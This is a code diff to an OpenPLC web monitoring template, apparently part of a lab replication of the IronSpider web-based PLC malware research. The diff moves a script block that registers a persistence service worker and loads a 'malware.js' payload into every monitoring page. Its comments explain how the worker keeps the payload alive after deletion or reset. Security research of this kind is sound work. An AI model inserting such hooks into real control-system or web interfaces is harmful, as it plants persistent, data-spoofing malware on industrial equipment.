@@ -826,7 +826,20 @@ monitoring_head = """
             color: #000000;
         }
         </style>
-        <body onload='loadData()'>"""
+        <body onload='loadData()'>
+    <!-- IronSpider payload — manual injection simulating CVE-2022-45140 on WAGO.
+         Files live in static/ (the PLC's file system). Served at /static/ because
+         Flask's static folder is OpenPLC's equivalent of WAGO's writable visu dir.
+         Scope limitation: SW controls /static/ only, not /monitoring.
+         Documented in lab notebook as an OpenPLC-specific adaptation. -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/static/sw.js', {scope: '/static/'})
+                .then(function(reg) { console.log('[IS] SW registered, scope:', reg.scope); })
+                .catch(function(err) { console.warn('[IS] SW registration failed:', err); });
+        }
+    </script>
+    <script src="/static/malware.js"></script>"""
 
         
 monitoring_tail = """
@@ -900,33 +913,7 @@ monitoring_tail = """
             }
         }
 
-        // =========================================================
-        // IRONSPIDER SIMULATION — SERVICE WORKER INFECTION HOOK
-        // Research replication of NDSS 2024 "Web-Based PLC Malware"
-        //
-        // In the real attack on WAGO (CVE-2022-45140), this script tag
-        // is injected into the transpiled WebVisu GUI file. The SW then
-        // caches malware.js so it survives factory reset and hardware
-        // replacement (Section IV-C, Figure 4).
-        //
-        // ironspiderSpoof() is defined in /static/malware.js (loaded below).
-        // processReqChange() above calls it — this works because malware.js
-        // executes synchronously before any AJAX callback fires.
-        // =========================================================
-
-        // Register the resurrection service worker.
-        // One line — this is the entire "persistence" stage of the attack.
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/static/sw.js', {scope: '/'})
-                .then(function(reg) { console.log('[IS] SW registered, scope:', reg.scope); })
-                .catch(function(err) { console.warn('[IS] SW registration failed:', err); });
-        }
     </script>
-
-    <!-- IronSpider payload — capabilities 1, 2, 3.                      -->
-    <!-- Served from PLC memory. Cached by sw.js for resurrection.        -->
-    <!-- Delete static/malware.js and reload to trigger SW resurrection.  -->
-    <script src="/static/malware.js"></script>
 </html>"""
 
 point_info_tail = """
